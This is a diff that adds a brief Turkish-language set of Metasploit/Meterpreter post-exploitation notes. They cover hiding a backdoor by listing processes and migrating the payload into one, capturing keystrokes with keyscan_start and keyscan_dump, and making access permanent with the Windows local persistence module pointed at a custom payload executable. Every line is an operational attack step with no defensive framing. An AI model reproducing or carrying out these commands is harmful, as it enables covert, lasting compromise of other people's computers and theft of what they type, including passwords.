@@ -1,0 +1,15 @@
+backdoor u gizleme
+ps / çalışan uygulamaları gösterir
+migrate saklicağımız dosyanın id si / payloadı oraya aktarır
+
+keylogger
+keyscan_start
+keyscan_dump
+
+herzaman erişim elde etmek
+< use exploit/windows/local/persistence
+< show options
+ayarlarını yap
+< show advanced
+< set EXE: :CUSTOM /var/www/html/backdoor/payload ( payload a virusunun adını koy )
+< exploit -j -z
